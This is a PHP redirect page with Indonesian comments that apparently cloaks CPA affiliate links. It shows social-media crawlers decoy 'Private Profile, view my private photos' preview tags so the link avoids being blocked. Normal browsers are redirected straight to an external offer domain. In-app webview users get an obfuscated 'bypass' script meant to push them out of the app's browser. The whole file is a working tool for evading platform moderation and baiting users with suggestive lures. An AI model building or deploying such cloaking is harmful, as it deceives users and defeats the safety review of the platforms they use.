<?php
// 1. Tangkap Target URL dan Preservasi Parameter (CPA Tracking)
$base_target_url = "https://flychicken.my.id/63dd6a988";
$query_string = $_SERVER['QUERY_STRING'] ?? '';
$final_url = !empty($query_string) ? $base_target_url . "?" . $query_string : $base_target_url;

// 2. Deteksi User-Agent
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_bot = preg_match('/(facebookexternalhit|WhatsApp|Twitterbot|Pinterest|Googlebot|bingbot|Yandex)/i', $ua);
$is_ios = preg_match('/(iPhone|iPod|iPad)/i', $ua);
$is_android = preg_match('/Android/i', $ua);
$is_webview = preg_match('/(FBAN|FBAV|Instagram|Line|TikTok|Snapchat)/i', $ua);

// 3. Filter Bot (Mencegah URL diblokir dan menampilkan meta tag yang rapi)
if ($is_bot) {
    echo '<!DOCTYPE html><html><head>';
    echo '<meta property="og:title" content="Private Profile" />';
    echo '<meta property="og:description" content="View my private photos and videos." />';
    echo '<meta property="og:image" content="https://domainanda.com/thumbnail.jpg" />';
    echo '</head><body></body></html>';
    exit;
}

// 4. Jika BUKAN Webview (Desktop/Browser Biasa), langsung Redirect 301 Instan
if (!$is_webview) {
    header("Location: " . $final_url, true, 301);
    exit;
}

// 5. Bersihkan URL untuk penyusunan parameter Intent Android
$intent_url_clean = str_replace(['https://', 'http://'], '', $final_url);

// 6. Muat file JSON untuk Bahasa (menggunakan __DIR__ agar akurat di Vercel)
$json_data = file_get_contents(__DIR__ . '/lang.json');
$translations = json_decode($json_data, true);

// 7. Deteksi bahasa browser (Ambil 2 huruf pertama)
$browser_lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) : 'en';

// 8. Tentukan bahasa yang dirender (Gunakan 'en' sebagai default mutlak)
$t = isset($translations[$browser_lang]) ? $translations[$browser_lang] : $translations['en'];
?>
<!DOCTYPE html>
<html lang="<?= htmlspecialchars($browser_lang) ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title><?= htmlspecialchars($t['title']) ?></title>
    <!-- Memuat file CSS eksternal -->
    <link rel="stylesheet" href="/style.css">
</head>
<body>

    <!-- Background Layer -->
    <div class="bg-image"></div>

    <!-- Tampilan Loading -->
    <div id="loader-box" class="loader-wrapper">
        <div class="loader"></div>
        <p class="loading-text"><?= htmlspecialchars($t['loading']) ?></p>
    </div>

    <!-- Tampilan Utama / Tombol -->
    <div id="action-box" class="container">
        <div class="icon-wrapper">
            <!-- Ikon SVG (Biarkan sama) -->
        </div>
        <h3><?= htmlspecialchars($t['title']) ?></h3>
        <p><?= htmlspecialchars($t['desc']) ?></p>
        <button id="bypass-btn" class="btn"><?= htmlspecialchars($t['btn']) ?></button>
    </div>

<?php 
    // Panggil modul keamanan (menggunakan __DIR__)
    require_once __DIR__ . '/obfuscator.php';
    
    // Eksekusi generator script yang sudah diacak
    echo generateSecureBypass($final_url, $is_android, $is_ios, $intent_url_clean);
?>
</body>
</html>
